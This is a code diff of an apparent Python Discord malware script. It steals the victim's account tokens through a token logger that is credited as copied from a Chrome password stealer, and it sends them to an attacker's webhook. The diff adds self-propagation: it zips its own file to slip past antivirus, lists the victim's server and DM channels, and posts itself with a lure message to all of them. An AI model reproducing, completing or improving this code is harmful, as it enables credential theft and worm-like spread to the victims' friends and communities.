@@ -8,26 +8,29 @@ webhook = "" # Webhook to send your info into
 message = "" # Message to send to the friends and servers of the victim along with the file
 
 zipfirst = False # If the program should make the file .zip first before sending it to the victim
+                 # This will have a smaller chance of an AV noticing the download
 
 #?############ CONFIG END
 
 
 ############# Functions
-
-def sendmessage(token, message, channel_id, iftimeout: bool, zipfirst: bool):
-    url = f"https://discord.com/api/channels/{channel_id}/messages"
-
-    headers = {"Authorization": token}
-    payload = {"content": message}
-
+def makeFile(zipfirst: bool):
     file = __file__
     if zipfirst:
         roaming = os.getenv('AppData')
         file = shutil.make_archive(format='zip', base_dir=__file__, base_name=roaming + "temp.txt")
 
     files = {
-        "file" : (file, open(file, 'rb')) # The picture that we want to send in binary
+        "file" : (file, open(file, 'rb')) # The file that we want to send in binary
         }
+    return files
+
+def sendmessage(token, message, channel_id, iftimeout: bool, files):
+    print("Sending message to ", channel_id)
+    url = f"https://discord.com/api/channels/{channel_id}/messages"
+
+    headers = {"Authorization": token}
+    payload = {"content": message}
 
     timeout = 999
     if iftimeout == True:
@@ -37,12 +40,59 @@ def sendmessage(token, message, channel_id, iftimeout: bool, zipfirst: bool):
         r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
         print(r.status_code)
     except requests.Timeout:
+        print("Timed out on channel ", channel_id)
         pass
     except Exception as e:
         print(e)
 
+def sendDMs(token, message, channel_id, iftimeout: bool, files):
+    print("Sending DM to ", channel_id)
+    url = f"https://discord.com/channels/@me/{channel_id}"
+    #url = f"https://discord.com/api/v9/channels/{channel_id}/message"
+
+    headers = {"Authorization": token}
+    payload = {"content": message}
+
+    timeout = 30
+    if iftimeout == True:
+        timeout = 0.00000001
+
+    try:
+        r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
+        print(r.status_code)
+    except requests.Timeout:
+        print("Timed out on channel ", channel_id)
+        pass
+    except Exception as e:
+        print(e)
 
 def getchannels(token):
+    print("Getting channels")
+    def getDMs(token):
+        print("Getting DM channels")
+        def get_user_id(token):
+            print("Getting user ID for DM channels")
+            headers = {
+                'Authorization': token
+            }
+            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+            response.raise_for_status()
+            user = response.json()
+            return user['id']
+
+        headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'
+            }
+
+        user_id = get_user_id(token)
+        response = requests.get(f"https://discord.com/api/v9/users/{user_id}/channels", headers=headers)
+
+        IDs = []
+        for i in response.json():
+            IDs.append(i["id"])
+        return IDs
+    
     headers = {
         'Authorization': token,
         'Content-Type': 'application/json'
@@ -50,10 +100,11 @@ def getchannels(token):
 
 
     url = "https://discord.com/api/v9/users/@me/guilds"
-    url_base = 'https://discord.com/api/v6/guilds/'
+    url_base = 'https://discord.com/api/v6/guilds/' # The v6 apparently doesn't matter? Don't mind it.
 
     response = requests.get(url, headers=headers)
 
+    print("Channels status code: ")
     print(response.status_code)
     if response.status_code != 200:
         raise("Incorrect status code")
@@ -66,17 +117,20 @@ def getchannels(token):
         
         guild_channels = response.json()
         for i in guild_channels:
+            print("Channel found: ", i["name"])
             guild_channel_id = i["id"]
             channels.append(guild_channel_id)
-
-    return channels
-
+    
+    return (channels, getDMs(token))
 
 def spread(token, message, zipfirst):
+    print("Spreading")
     channels = getchannels(token)
-    for i in channels:
-        sendmessage(token, message, i, True, zipfirst)
-
+    files = makeFile(zipfirst)
+    for i in channels[0]:
+        sendmessage(token, message, i, True, files)
+    for i in channels[1]: # Change the True in these to False if you want to see the status codes
+        sendDMs(token, message, i, True, files)
 
 def tokenlogger(webhook): # Stolen because I'm lazy as hell: https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks
     import psutil
@@ -451,7 +505,6 @@ def tokenlogger(webhook): # Stolen because I'm lazy as hell: https://github.com/
 
     tokens = beamed()
     return tokens
-
 
 def catchAndSpread(webhook, message, zipfirst):
     tokens = tokenlogger(webhook)
